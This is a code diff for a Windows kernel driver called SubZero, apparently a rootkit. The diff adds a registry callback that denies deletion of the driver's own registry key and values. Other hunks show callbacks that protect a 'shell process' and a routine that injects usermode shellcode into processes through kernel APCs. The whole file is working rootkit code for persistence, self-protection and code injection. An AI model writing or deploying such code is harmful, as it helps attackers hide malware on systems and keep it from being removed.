@@ -4,6 +4,7 @@
 Globals g_Globals;
 DRIVER_UNLOAD SubZeroUnload;
 DRIVER_DISPATCH SubZeroCreateClose, SubZeroRead;
+NTSTATUS OnRegistryNotify(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);
 OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
 void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
 void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
@@ -14,6 +15,8 @@ bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunctio
 extern "C" NTSTATUS
 DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	KdPrint((DRIVER_PREFIX "[+] Driver was loaded\n"));
+
+	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"12345.6171");
 
 	// Build registration structures for shell process' protection
 	OB_OPERATION_REGISTRATION operations[] = {
@@ -26,7 +29,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	OB_CALLBACK_REGISTRATION reg = {
 		OB_FLT_REGISTRATION_VERSION,
 		1,										// operation count
-		RTL_CONSTANT_STRING(L"12345.6171"),		// altitude
+		altitude,		// altitude
 		nullptr,							    // context
 		operations
 	};
@@ -54,9 +57,17 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 		symLinkCreated = true;
 
 		// Register for object notifications
-		status = ObRegisterCallbacks(&reg, &g_Globals.RegHandle);
+		status = ObRegisterCallbacks(&reg, &g_Globals.ObjectRegistrationHandle);
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "[-] Failed to register object callbacks (status=0x%08X)\n", status));
+			break;
+		}
+
+		status = CmRegisterCallbackEx(OnRegistryNotify, &altitude, DriverObject,
+			nullptr, &g_Globals.RegistryRegistrationCookie, nullptr);
+		if (!NT_SUCCESS(status)) {
+			KdPrint((DRIVER_PREFIX "failed to set registry callback (%08X)\n",
+				status));
 			break;
 		}
 
@@ -98,15 +109,17 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	DriverObject->DriverUnload = SubZeroUnload;
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = SubZeroCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_READ] = SubZeroRead;
-
 	return status;
 }
 
 void SubZeroUnload(PDRIVER_OBJECT DriverObject) {
-	// unregister all notifications in case of an error
+	// unregister process & thread notifications in case of an error
 	PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
 	PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
-	ObUnRegisterCallbacks(g_Globals.RegHandle);
+
+	// unregister object & registry notifications
+	ObUnRegisterCallbacks(g_Globals.ObjectRegistrationHandle);
+	CmUnRegisterCallback(g_Globals.RegistryRegistrationCookie);
 
 	// Wait for KAPC to finish in case of an error
 	::ExWaitForRundownProtectionRelease(&g_Globals.RundownProtection);
@@ -130,6 +143,38 @@ NTSTATUS SubZeroRead(PDEVICE_OBJECT, PIRP Irp) {
 	Irp->IoStatus.Status = STATUS_SUCCESS;
 	Irp->IoStatus.Information = 0;
 	IoCompleteRequest(Irp, 0);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
+	REG_DELETE_KEY_INFORMATION* deleteKeyInfo;
+	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo;
+	PCUNICODE_STRING name;
+
+	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)Argument1) {
+	case RegNtPreDeleteKey:
+		deleteKeyInfo = (REG_DELETE_KEY_INFORMATION*)Argument2;
+		if (NT_SUCCESS(CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteKeyInfo->Object, nullptr, &name, 0))) {
+
+			// filter out none-subzero deletions
+			if (::wcsncmp(name->Buffer, REG_MACHINE REG_SZ_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_SZ_KEY_PATH) - 1) == 0) {
+				KdPrint((DRIVER_PREFIX "[+] Registry key deletion attempt detected\n"));
+				return STATUS_ACCESS_DENIED;
+			}
+		}
+	case RegNtPreDeleteValueKey:
+		deleteValueInfo = (REG_DELETE_VALUE_KEY_INFORMATION*)Argument2;
+		if (NT_SUCCESS(CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
+
+			// filter out none-subzero deletions
+			if (::wcsncmp(name->Buffer, REG_MACHINE REG_SZ_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_SZ_KEY_PATH) - 1) == 0) {
+				KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
+				return STATUS_ACCESS_DENIED;
+			}
+		}
+	}
+
+	// No match found
 	return STATUS_SUCCESS;
 }
 
@@ -202,10 +247,7 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
 	}
 }
 
-void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
-	UNREFERENCED_PARAMETER(Process);
-	UNREFERENCED_PARAMETER(ProcessId);
-
+void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
 	// process creation only
 	if (!CreateInfo) return;
 
@@ -372,11 +414,11 @@ void InjectUsermodeShellcodeAPC(unsigned char* shellcode, SIZE_T shellcodeSize) 
 
 	// Copy shellcode
 	if (int errorCode = ::memcpy_s(mappedAddress, shellcodeSize, shellcode, shellcodeSize)) {
-		KdPrint((DRIVER_PREFIX "[-] Error copying shellcode to mapped address - (0x%llx). Error code: (0x%08X)\n", mappedAddress, errorCode));
+		KdPrint((DRIVER_PREFIX "[-] Error copying shellcode to mapped address - (0x%px). Error code: (0x%08X)\n", mappedAddress, errorCode));
 		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 		return;
 	}
-	KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%llx). Size: %d bytes\n", address, shellcodeSize));
+	KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)shellcodeSize));
 
 	// Free MDL pages
 	::MmUnmapLockedPages(mappedAddress, mdl);
